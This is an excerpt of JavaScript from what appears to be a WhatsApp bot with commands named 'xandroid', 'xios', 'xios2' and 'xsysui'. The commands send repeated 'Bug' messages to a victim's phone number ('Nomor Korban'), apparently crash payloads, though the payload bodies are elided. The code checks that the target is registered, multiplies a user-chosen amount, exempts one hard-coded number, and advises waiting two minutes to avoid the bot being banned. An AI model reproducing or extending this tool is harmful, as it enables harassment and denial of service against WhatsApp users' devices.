...
case "xandroid": {
  ...
  sendMessageWithMentions(
    ...
    " Using *" + command + "* ✅\n\nTunggu 2 menit biar bot nya ngga di banned.", 
    [whatsappNumber]
  );
}
break;
case "xios": {
  ...
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nTunggu 2 menit biar bot nya ga di banned.", 
    [whatsappNumber]
  );
}
break;
case "xios2":
  {
    ...
    if (!text){
      return replygcxeon(`Contoh nya: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return replygcxeon("Jumlah harus angka");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    replygcxeon("please wait, " + command + " Bug nya lagi diproses..");
  ...
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nTunggu 2 menit biar bot nya ngga dibanned.", 
    [whatsappNumber]
  );
}
break;
case "xsysui": {
  ...
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replygcxeon(`Use ${prefix+command} Nomor Korban|jumlah\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replygcxeon("Amount must be a number");
  }
  ...
  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6288298909654") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
